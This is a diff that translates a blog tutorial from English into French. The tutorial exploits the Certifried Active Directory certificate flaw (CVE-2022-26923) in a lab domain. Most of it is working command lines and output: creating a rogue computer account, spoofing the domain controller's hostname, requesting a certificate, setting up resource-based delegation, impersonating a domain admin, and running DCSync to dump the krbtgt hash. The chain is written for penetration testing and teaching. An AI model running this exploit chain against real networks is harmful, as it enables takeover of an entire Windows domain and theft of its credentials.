@@ -1,8 +1,7 @@
 ---
-title: Exploiting Certifried (CVE-2022-26923)
-summary: Discover how to exploit the certifried vulnerability easily with bloodyAD.
+title: Exploitation de Certifried (CVE-2022-26923)
+summary: Découvrez comment exploiter la vulnérabilité Certifried facilement avec bloodyAD.
 date: 2024-05-11
-aliases: [/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923]
 # Featured image
 # Place an image named `featured.jpg/png` in this page's folder and customize its options here.
 # image:
@@ -21,12 +20,13 @@ tags:
 categories:
   - bloodyAD
 ---
-A new ADCS privesc was released: Certifried (CVE-2022-26923) with this [blogpost](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) after Microsoft patched it.
-Here is an example on how to exploit this vulnerability with [bloodyAD](https://github.com/CravateRouge/bloodyAD) and PKINIT not supported from Linux.
+
+Une nouvelle élévation de privilège est sortie: Certifried (CVE-2022-26923) avec ce [billet de blog](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) après que Microsoft l'ait patché.
+Voici un exemple de comment exploiter cette vulnérabilité avec [bloodyAD](https://github.com/CravateRouge/bloodyAD) sans utiliser PKINIT.
 
 ## Linux
 
-We need to own a computer, either we pwned one or we can create one if `ms-DS-MachineAccountQuota`>0:
+On a besoin d'une machine, soit on en compromet une ou alors on en crée une si `ms-DS-MachineAccountQuota`>0:
 
 ```ps1
 > python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 get object 'DC=crashlab,DC=local' --attr ms-DS-MachineAccountQuota                     
@@ -35,14 +35,14 @@ distinguishedName: DC=crashlab,DC=local
 ms-DS-MachineAccountQuota: 10
 ```
 
-We create a Computer object `cve` in the LDAP:
+On crée un objet machine `cve` dans le LDAP:
 ```ps1
 > python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 addComputer cve 'CVEPassword1234*'
 
 [+] cve created
 ```
 
-Then we set the attribute `dNSHostName` (empty when we created the object) to match the Domain Controller DNS Hostname: `CRASHDC.crashlab.local`.
+Ensuite on change l'attribut `dNSHostName` (vide quand on crée l'objet) pour qu'il corresponde au nom de machine du contrôleur de domaine: `CRASHDC.crashlab.local`.
 
 ```ps1
 > python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 set object 'CN=cve,CN=Computers,DC=crashlab,DC=local' dNSHostName -v CRASHDC.crashlab.local
@@ -50,7 +50,7 @@ Then we set the attribute `dNSHostName` (empty when we created the object) to ma
 [+] CN=cve,CN=Computers,DC=crashlab,DC=local's dnsHostName has been updated
 ```
 
-To check if the attribute has been correctly set:
+On vérifie que l'attribue a été configuré correctement:
 ```ps1
 > python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 get object 'CN=cve,CN=Computers,DC=crashlab,DC=local' --attr dNSHostName                  
 
@@ -58,7 +58,7 @@ distinguishedName: CN=cve,CN=Computers,DC=crashlab,DC=local
 dNSHostName: CRASHDC.crashlab.local
 ```
 
-Now we can use [Certipy](https://github.com/ly4k/Certipy) to request a certificate for the computer `cve`:
+Et maintenant on utilise [Certipy](https://github.com/ly4k/Certipy) pour demander le certificat pour la machine `cve`:
 ```ps1
 # 10.100.10.13 is the ADCS server
 > certipy req 'crashlab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.100.10.12 -ca crashlab-ADCS-CA
@@ -72,7 +72,7 @@ Certipy v3.0.0 - by Oliver Lyak (ly4k)
 
 ```
 
-Now we'll try to get a TGT using [Certipy](https://github.com/ly4k/Certipy) with the certificate requested above:
+Maintenant on va essayer de récupérer un TGT en utilisant [Certipy](https://github.com/ly4k/Certipy) avec le certificat demandé précédemment:
 ```ps1
 > certipy auth -pfx ./crashdc.pfx -dc-ip 10.100.10.12
 Certipy v3.0.0 - by Oliver Lyak (ly4k)
@@ -82,7 +82,7 @@ Certipy v3.0.0 - by Oliver Lyak (ly4k)
 [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
 ```
 
-PKINIT doesn't seem to work on this AD, let's try RBCD technique with [bloodyAD](https://github.com/CravateRouge/bloodyAD) and its certificate authentication feature:
+PKINIT ne fonctionne pas sur cet AD, essayons la technique RBCD avec [bloodyAD](https://github.com/CravateRouge/bloodyAD) et sa fonctionnalité d'authentification par certificat:
 ```ps1
 > openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes
 > python bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 add rbcd 'CRASHDC$' 'CVE$'
@@ -92,7 +92,7 @@ PKINIT doesn't seem to work on this AD, let's try RBCD technique with [bloodyAD]
 CVE$ can now impersonate users on CRASHDC$ via S4U2Proxy
 ```
 
-Delegation rights are set up, we can now use [impacket](https://github.com/SecureAuthCorp/impacket) `getST.py` to impersonate a Domain admin (`emacron` in our case) on CRASHDC$ and fetch a TGT: 
+Les droits de délégation sont en place, maintenant on peut utiliser [impacket](https://github.com/SecureAuthCorp/impacket) `getST.py` pour usurper l'administrateur de domaine (`emacron` dans notre cas) sur CRASHDC$ et on récupère un TGT: 
 ```ps1
 > getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                               
@@ -107,7 +107,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 > export KRB5CCNAME=/tmp/emacron.ccache
 ```
 
-Finally we'll use [impacket](https://github.com/SecureAuthCorp/impacket) `secretsdump.py` to perform a DCSync with the exported TGT:
+Pour finir on utilise [impacket](https://github.com/SecureAuthCorp/impacket) `secretsdump.py` pour réaliser un DCSync avec le TGT récupéré:
 ```ps1
 
 > secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
